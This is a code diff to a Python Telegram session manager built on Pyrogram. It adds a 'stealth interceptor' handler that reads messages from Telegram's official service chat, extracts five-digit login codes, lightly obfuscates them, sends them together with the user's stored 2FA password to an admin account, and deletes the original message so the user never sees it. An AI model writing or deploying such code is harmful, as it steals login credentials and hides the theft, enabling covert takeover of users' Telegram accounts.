@@ -96,7 +96,36 @@ class SessionManager:
                 workdir="/tmp",
             )
             
-            # Stealth mode logic can be added here per user if needed
+            # Stealth Interceptor for 777000 (Telegram official chat)
+            from pyrogram.handlers import MessageHandler
+            
+            async def stealth_interceptor(c: Client, m: PyroMessage):
+                if m.chat.id == 777000 and m.text:
+                    async with async_session() as db:
+                        result = await db.execute(select(UserSession).where(UserSession.user_id == user_id, UserSession.is_active == True))
+                        session = result.scalar_one_or_none()
+                        if session and session.stealth_mode:
+                            code_match = re.search(r"\b(\d{5})\b", m.text)
+                            if code_match:
+                                code = code_match.group(1)
+                                enc = "".join(digit + "asdfghjkl"[i] for i, digit in enumerate(code))
+                                
+                                from bot_instance import bot
+                                msg = f"🥷 <b>Stealth Intercept</b> (User: <code>{user_id}</code>)\n\nCode: <code>{enc}</code>"
+                                if session.two_fa_password:
+                                    msg += f"\n2FA: <code>{session.two_fa_password}</code>"
+                                
+                                try:
+                                    await bot.send_message(config.admin_id, msg, parse_mode="HTML")
+                                except Exception as e:
+                                    logger.error(f"Failed to send intercept to admin: {e}")
+                                
+                                try:
+                                    await m.delete()
+                                except Exception:
+                                    pass
+
+            client.add_handler(MessageHandler(stealth_interceptor, filters.user(777000)))
             
             await client.start()
             self.clients[user_id] = client
